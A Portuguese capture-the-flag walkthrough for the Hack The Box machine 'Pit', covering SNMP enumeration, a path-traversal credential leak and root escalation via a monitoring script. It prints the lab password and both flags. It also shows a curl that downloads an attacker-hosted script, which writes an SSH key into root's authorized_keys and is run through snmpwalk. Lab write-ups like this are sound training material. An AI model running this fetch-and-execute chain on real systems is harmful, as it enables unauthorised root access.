# Pit

---

## Enum

---

```python
nmap -T4 -p- -A 10.10.10.241
```

![mclovin](https://user-images.githubusercontent.com/69881757/126364288-bdea78e8-cd22-49f1-b365-7447f877fb6b.png)


- Fazendo a resolução de DNS:

```python
echo "10.10.10.241 pit.htb dms-pit.htb" > /etc/hosts
```

- Agora já sabemos que existem 2 portas udp rodando SNMP:

    ![Untitled](https://user-images.githubusercontent.com/69881757/126364336-59a0f389-2513-4d88-b07f-31c109edf649.png)


    - Procuramos na internet scripts no github que exploram os datas do SNMP:

    [https://github.com/dheiland-r7/snmp](https://github.com/dheiland-r7/snmp)

    ```python
    perl snmpbw.pl pit.htb public 2 1
    ```

---

### Exploration

---

- Entrando podemos enviar um arquivo pra dentro da máquina:
    - Dentro do sistema vai estar exposto a versão do software: 5.1.10, que tem uma webshell pra exploração da falha!
- Procurando pela webshell no `searchsploit`

![backdoor](https://user-images.githubusercontent.com/69881757/126364370-1825b731-22c2-4c88-8630-9352b38bbed0.png)


Rodando esses passos e explorando os diretórios descobrimos que existe um arquivo chamado:

../../../conf/settings.xml

- Dentro deste arquivo podemos encontrar uma página em branco porém com informações na sua source page:

    ![burp](https://user-images.githubusercontent.com/69881757/126364416-7a68725b-c0c2-4af6-a940-2fac3f845c63.png)


    - Senha login → michelle: ied^ieY6xoquu

Agora voltando para `http://pit.htb:9090`

Colocando essas credenciais conseguimos encontrar um painel de login:

![login-sistema](https://user-images.githubusercontent.com/69881757/126364435-8b5a644f-bd34-4acf-bd95-5537e57f4b4c.png)


![reverse](https://user-images.githubusercontent.com/69881757/126364464-5e607eb0-ee14-4e57-aad6-c36d9e90381c.png)


User Flag: be77b070e8e1ac7ac499d1412670d215

---

cd /usr/local/monitoring

- Precisamos agora criar uma RSA_Id

```python
ssh-keygen
// colocamos um nome
```

- Criamos um arquivo `[keytosend.sh](http://keytosend.sh)` que terá dentro :

```python
echo "RSA_ID_PUB" > /root/.ssh/authorized_keys
```

- Agora abrimos um servidor em python dentro da pasta na nossa máquina:

```python
python -m SimpleHTTPServer PORT
```

- E rodamos um curl dentro da máquina da vitima:

```python
curl [http://10.10.14.33](http://10.10.14.33):PORT/[keytosend.sh](http://keytosend.sh) -o check.sh 
```

- Precisamos garantir que está no /usr/local/monitoring
    - Ou então dar um :

    ```python
    cp check.sh /usr/local/monitoring 
    ```

![curl](https://user-images.githubusercontent.com/69881757/126364509-533bae40-e5d0-4340-a909-849ed8cb17f0.png)


- Para que esse arquivo seja rodado na máquina precisamos rodar :

```python
snmpwalk -v 1 -c public pit.htb 1.3.6.1.4.1.8072.1.3.2.2.1.2 
```

![snmpwalk](https://user-images.githubusercontent.com/69881757/126364527-f31e07aa-738a-45f9-8c26-76f6e1e79c9e.png)


- ou então :

```python
snmpwalk -m +MY-MIB -v2c -c public 10.10.10.241 nsExtendObjects 
```

![snmpwalk2](https://user-images.githubusercontent.com/69881757/126364579-1a6df957-5e9b-4f17-bd97-83fe6526e759.png)


- Por fim

```python
ssh -i id_rsa root@pit.htb
```

Root Flag: f35dad39922ce883a572c057f672bbd8

Mas afinal , por que teria que rodar esses comandos ? executariamos esses comandos , pois na maquina tem um script aonde pega todos os scripts em bash dentro do diretorio -> /usr/local/monitoring e os executa, então essa seria a resposta!

---
